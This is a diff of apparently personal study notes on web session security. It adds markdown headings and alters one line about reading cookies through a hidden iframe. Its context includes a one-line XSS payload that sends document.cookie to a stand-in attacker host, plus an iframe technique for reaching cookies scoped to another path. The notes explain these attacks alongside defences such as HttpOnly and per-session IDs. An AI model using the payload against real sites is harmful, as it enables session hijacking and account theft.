@@ -25,7 +25,7 @@ But in our current server approach, shortcoming is, if a malware can sniff out m
 
 Can fix this by creating a unique sessionId associated with the session and destroy it when you logout.
 
-Session Hijacking via XSS
+### Session Hijacking via XSS
 
 If website is vulnerable to xss, user can execute the insert the code into the webpage and can ex-filtrate the cookie.
 
@@ -33,7 +33,7 @@ If website is vulnerable to xss, user can execute the insert the code into the w
 new Image().src = "https://hacker-man?cookie=" + document.cookie;
 ```
 
-Workout being set cookie with HttpOnly
+### Workout being set cookie with HttpOnly
 
 As an additional layer of security, you can specify a path to your cookies
 `name=xyz; Path=/a/b`
@@ -55,5 +55,5 @@ iframe.style.display = "none";
 
 // then get access via
 
-iframe.contentDocument;
+iframe.contentDocument.cookie;
 ```
